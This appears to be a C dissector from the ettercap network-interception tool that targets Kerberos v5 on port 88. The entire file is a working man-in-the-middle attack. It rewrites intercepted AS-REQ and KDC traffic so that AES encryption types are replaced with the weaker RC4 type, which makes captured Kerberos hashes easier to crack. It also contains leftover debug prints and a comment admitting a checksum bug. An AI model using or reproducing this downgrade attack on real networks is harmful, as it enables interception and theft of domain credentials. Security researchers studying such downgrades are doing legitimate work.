/*
    ettercap -- dissector for Kerberos v5 - TCP 88 / UDP 88

    Copyright (C) Dhiru Kholia (dhiru at openwall.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include <ec.h>
#include <ec_decode.h>
#include <ec_dissect.h>
#include <ec_session.h>

/* protos */

FUNC_DECODER(dissector_kerberos);
void kerberos_init(void);


/************************************************/

/*
 * this function is the initializer.
 * it adds the entry in the table of registered decoder
 */

void __init kerberos_init(void)
{
   dissect_add("kerberosu", APP_LAYER_UDP, 88, dissector_kerberos);
   dissect_add("kerberost", APP_LAYER_TCP, 88, dissector_kerberos);
}

FUNC_DECODER(dissector_kerberos)
{
   u_char *ptr;
   ptr = PACKET->DATA.data;
   char *p = NULL;
   /* Check for initial AS-REQ packet */
   if (FROM_CLIENT("kerberosu", PACKET) || FROM_CLIENT("kerberost", PACKET)) {
      puts("FC");
      p = memmem(ptr, PACKET->DATA.len, "\x12\x02\x01", 3);
      if(p) {
         // *p = '\x17';
         // *p = '\x17'; // Allow KDC to use etype 18, this allows
	 // downgrade attacks even if KDC doesn't support etype 23
	 // which we are trying to downgrade to
      }
      p = memmem(ptr, PACKET->DATA.len, "\x02\x01\x11\x02", 4);
      if(p) {
	 puts("2");
         PACKET->flags |= PO_MODIFIED;
         PACKET->flags |= PO_FORWARDABLE;
         p[2] = '\x17';
      }
      p = memmem(ptr, PACKET->DATA.len, "\x02\x01\x10\x02", 4);
      if(p) {
	 puts("3");
	 PACKET->flags |= PO_MODIFIED;
         PACKET->flags |= PO_FORWARDABLE;
	 p[2] = '\x17';
      }
   }
   else {
      puts("FS");
      // replace etype 18 (which should be at top of the list by etype 23 */
      // BUG: if run the following code caused invalid UDP checksums on client side!
      p = memmem(ptr, PACKET->DATA.len, "\x03\x02\x01\x12", 4);
      if(p) {
         p[3] = '\x17';
	 puts("Z");
         PACKET->flags |= PO_MODIFIED;
         PACKET->flags |= PO_FORWARDABLE;
      }
   }
}
